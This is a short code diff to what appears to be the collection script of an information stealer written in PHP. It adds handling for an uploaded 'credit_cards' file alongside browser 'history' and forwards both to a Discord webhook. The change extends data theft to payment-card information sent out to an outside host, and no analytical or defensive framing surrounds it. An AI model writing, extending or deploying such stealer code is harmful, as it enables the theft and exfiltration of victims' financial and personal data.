@@ -142,6 +142,10 @@ if (isset($_FILES['history'])) {
     $dw->add_file($_FILES['history']['tmp_name'], $_FILES['history']['name']);
 }
 
+if (isset($_FILES['credit_cards'])) {
+    $dw->add_file($_FILES['credit_cards']['tmp_name'], $_FILES['credit_cards']['name']);
+}
+
 $dw->send();
 
 class DiscordWebhook
